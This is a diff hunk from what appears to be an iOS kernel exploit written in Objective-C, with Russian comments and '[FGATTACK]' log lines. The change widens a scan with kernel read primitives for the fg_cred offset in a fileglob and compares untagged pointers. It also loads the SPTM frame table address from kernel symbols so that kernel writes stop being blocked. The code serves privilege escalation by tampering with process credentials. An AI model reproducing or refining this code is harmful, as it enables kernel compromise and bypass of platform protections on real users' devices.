@@ -2337,12 +2337,21 @@ static NSString *kpFmtSptmFn(uint64_t raw)
                     kpNote(r, [NSString stringWithFormat:@"  [FGATTACK] fileproc=%#llx fileglob=%#llx", (unsigned long long)fp, (unsigned long long)glob]);
                     uint32_t fgOff = 0xFFFFFFFF;
                     if (kpLooksLikeKernelPointer(glob)) {
-                        for (uint32_t o = 0; o + 8 <= 0x200; o += 8)
-                            if (early_kread64(glob + o) == curUcred) { fgOff = o; break; }
+                        // 2.0.47: сравнение ПОСЛЕ untag — в поле лежит
+                        // тегированный указатель; и скан шире (0x400).
+                        for (uint32_t o = 0; o + 8 <= 0x400; o += 8)
+                            if (kp_untag_ptr(early_kread64(glob + o)) == curUcred) { fgOff = o; break; }
                         kpNote(r, [NSString stringWithFormat:@"  [FGATTACK] fg_cred offset=%@",
                                   fgOff != 0xFFFFFFFF ? [NSString stringWithFormat:@"+%#x ★", fgOff] : @"not found"]);
                     }
                     kpNote(r, @"  [FGATTACK] step4: fg_cred измерен, запускаю walker (kvtophys) — следующая строка либо type, либо ребут");
+                    // 2.0.47: frame table VA — без неё kpFrameTypeOf даёт -1
+                    // и kwrite блокируется. Берём из symbols напрямую.
+                    if (!gFrameTableVA) {
+                        uint64_t ft = kread_ptr(ksymbol(libsptm_frame_table));
+                        if (kpLooksLikeKernelPointer(ft)) { gFrameTableVA = ft; kpSetFrameTableVA(ft); }
+                        kpNote(r, [NSString stringWithFormat:@"  [FGATTACK] frame table VA=%#llx (init)", (unsigned long long)ft]);
+                    }
                     uint64_t globPA = kpLooksLikeKernelPointer(glob) ? kvtophys(glob & ~0x3fffULL) : 0;
                     kpNote(r, @"  [FGATTACK] step5: walker выжил");
                     int globT = globPA ? kpFrameTypeOf(globPA) : -1;
